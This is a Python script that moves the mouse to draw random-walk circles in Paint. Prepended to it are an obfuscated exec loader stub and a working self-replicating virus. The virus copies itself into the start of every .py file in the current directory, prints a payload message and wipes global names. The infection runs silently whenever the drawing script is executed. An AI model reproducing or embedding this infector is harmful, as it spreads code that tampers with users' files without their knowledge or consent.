
# begin-0bfe43108bb8c38d5922c5295ea3bdb4
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNoDAAAAAAE=')))")
# end-0bfe43108bb8c38d5922c5295ea3bdb4
# begin-virus

import glob

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

# entry point

try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code()

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i
# end-virus
import math

import mouse
import mouseinfo

from UTIL import *
from RandyDrawsmanver2 import *
MaximizePaint()
x0=900
y0=540
mouse.move(x0,y0)
def tnemgeSrawD(x0=x0,y0=y0,r=10, a=-5, d=0.001):
    mouse.click()
    x=math.cos(math.radians(a))*r
    y=math.sin(math.radians(a))*r
    mouse.drag(x0, y0, end_x=x+x0, end_y=y+y0, duration=d)
    return x+x0, y+y0
def drawcirclethingymobob():
    FailSafe()
    for i in range(100):
        tnemgeSrawD(r=250, a=5*i-5, d=0.001)
def irlcirclecaughtin4k(x0,y0,r=5,d=0.001,degree_per_step=10):
    last_x = x0+r*math.cos(0)
    last_y = y0+r*math.sin(0)
    mouse.move(last_x,last_y)
    for a in range(0, 360, degree_per_step):
        if FailSafe(): break
        a=math.radians(a)
        x=x0+r*math.cos(a)
        y=y0+r*math.sin(a)
        mouse.drag(start_x=last_x, start_y=last_y, end_x=x, end_y=y, duration=d)
        last_x = x
        last_y = y
    mouse.release()


def Randmwalk_with_circle(steps=1000, ss=4, dur=0.001, r=5, degree_per_step=10):
    MaximizePaint()
    x=start_x=906
    y=start_y=595
    mouse.release()
    mouse.move(x, y)
    for i in range(steps):
        mouse.release()
        if x>=1886:
            mouse.move(start_x, start_y)
        if y>=954 or y<=213:
            mouse.move(start_x, start_y)

        if FailSafe():
            break
        a=x+ss
        b=x-ss
        c=y+ss
        d=y-ss
        x2=random.choice([a,b])
        y2=random.choice([c,d])
        mouse.move(x2,y2, duration=dur, absolute=True)
        irlcirclecaughtin4k(x0=x2, y0=y2, r=r, degree_per_step=degree_per_step)
        x = x2
        y = y2

# irlcirclecaughtin4k(x0=x0,y0=y0,r=5,s=72)
# dg_45Randmwalk(steps=1)
# irlcirclecaughtin4k(x0=x,y0=y,r=5,s=72)
#x=x0+r*cos(a)
#y=y0+r*sin(a)
def hopefully_finished_project():
    for i in range(10):
        pick_a_color_any_color()
        Randmwalk_with_circle(steps=1, degree_per_step=10, r=30, ss=50)
hopefully_finished_project()